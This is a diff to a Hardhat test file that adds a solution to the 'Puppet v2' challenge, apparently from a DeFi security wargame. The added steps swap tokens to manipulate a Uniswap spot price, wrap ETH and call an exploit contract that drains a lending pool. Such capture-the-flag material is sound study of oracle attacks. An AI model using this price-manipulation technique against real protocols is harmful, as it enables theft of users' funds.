@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { parseEther } = require("ethers/lib/utils");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -83,6 +84,30 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy the exploit contract
+        const exploit = await (await ethers.getContractFactory('PuppetV2PoolExploit', deployer)).deploy(
+            uniswapExchange.address,
+            lendingPool.address,
+        );
+
+        // Sell all player's DVT tokens for ETH
+        await token.connect(player).approve(uniswapRouter.address, ethers.constants.MaxUint256);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {gasLimit: 30000000}
+        );
+
+        // Convert the bulk of player's ETH into WETH
+        await weth.connect(player).deposit({ value: parseEther("29.8")});
+
+
+        // Run the exploit
+        await weth.connect(player).approve(exploit.address, ethers.constants.MaxUint256);
+        await exploit.connect(player).exploit();
     });
 
     after(async function () {
